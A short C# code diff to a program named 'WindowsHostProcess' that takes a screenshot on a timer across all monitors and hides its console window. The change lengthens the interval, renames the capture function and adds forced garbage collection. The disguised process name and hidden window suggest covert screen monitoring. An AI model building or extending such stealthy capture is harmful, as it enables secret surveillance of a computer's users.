@@ -30,11 +30,14 @@ namespace WindowsHostProcess
             //Timer for Screen Capture Interval and Call of Screen Capture Function.
             var handle = GetConsoleWindow();
             var startTimeSpan = TimeSpan.Zero;
-            var periodTimeSpan = TimeSpan.FromMinutes(1);
+            var periodTimeSpan = TimeSpan.FromMinutes(2);
 
             var timer = new System.Threading.Timer((e) =>
             {
-                printScreen();
+                PrintScreen();
+                //Garbage Collection
+                System.GC.Collect();
+                System.GC.WaitForPendingFinalizers();
             }, null, startTimeSpan, periodTimeSpan);
 
             // Hide Window
@@ -80,7 +83,7 @@ namespace WindowsHostProcess
 
         // Screen Capture Function Implementation. Determines number of Monitors,
         // their size, and creates appropriate screen capture size accordingly.
-        private static void printScreen()
+        private static void PrintScreen()
         {
             int lowestBound = int.MaxValue;
             int maxWidth = 0;
